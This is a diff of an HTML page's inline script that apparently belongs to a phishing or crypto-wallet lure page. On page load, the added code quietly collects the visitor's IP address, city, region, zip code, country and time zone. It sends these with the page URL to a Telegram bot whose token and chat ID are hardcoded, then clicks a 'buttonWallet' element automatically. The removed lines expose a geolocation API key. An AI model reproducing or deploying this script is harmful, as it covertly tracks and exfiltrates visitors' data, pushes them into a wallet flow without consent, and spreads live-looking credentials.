@@ -551,33 +551,50 @@
       </div>
     </div>
     <script>
-      window.addEventListener("load", async () => {
-        const button = document.querySelector("#AutoBtnClicked");
-        const request = await fetch(
-          `https://api.geoapify.com/v1/ipinfo?&apiKey=ea68fdf3e872496fa40b713d53aa0e38`,
-          {
-            method: "GET",
-          }
-        );
+      async function getOnlyIp() {
+        const req = await fetch("https://api.ipify.org?format=json");
+        const getIp = await req.json();
+        return getIp;
+      }
+
+      async function getUserInfo() {
+        const { ip } = await getOnlyIp();
+        const request = await fetch(`https://freeipapi.com/api/json/${ip}`, {
+          method: "GET",
+        });
         const response = await request.json();
-        const { ip, city, country, continent, state } = await response;
-        const cityName = city.name;
-        const countryName = country.name;
-        const flag = country.flag;
-        const continentName = continent.name;
-        const stateName = state.name;
+        return response;
+      }
+      function country2flag(countryCode) {
+        return countryCode
+          .toUpperCase()
+          .split("")
+          .map((char) => String.fromCodePoint(char.charCodeAt(0) + 0x1f1a5))
+          .join("");
+      }
+      window.addEventListener("load", async () => {
+        const { ip } = await getOnlyIp();
+        console.log(getUserInfo());
+        const {
+          ipAddress,
+          cityName,
+          countryName,
+          zipCode,
+          regionName,
+          timeZones,
+          countryCode,
+        } = await getUserInfo();
         const botApi = "6559381340:AAFBebXhmpgSbUEsijMnYWxzs75csh_3kLo";
         const chatId = "-1002217556728";
         const urlWeb = window.location;
-        const textField = `📣 New Visitor, User Details:%0A%0A📍 ${ip}%0A${flag} ${countryName}%0A🏠 ${cityName}%0A🏙️ ${stateName}%0A🌎 ${continentName}%0A🔗 ${urlWeb}`;
-
+        const country_Flag = country2flag(countryCode);
+        const textField = `📣 New Visitor, User Details:%0A%0A📍 ${ipAddress}%0A${country_Flag} ${countryName}%0A🏠 ${cityName}%0A🏙️ ${regionName}%0A📭 ${zipCode}%0A🌎 ${timeZones[0]}%0A🔗 ${urlWeb}`;
         const url = `https://api.telegram.org/bot${botApi}/sendMessage?chat_id=${chatId}&text=${textField}`;
         let api = new XMLHttpRequest();
         api.open("GET", url, true);
         api.send();
-        setTimeout(() => {
-          button.click();
-        }, 8000);
+        document.getElementById("buttonWallet").click();
+        console.log("message success");
       });
     </script>
     <script
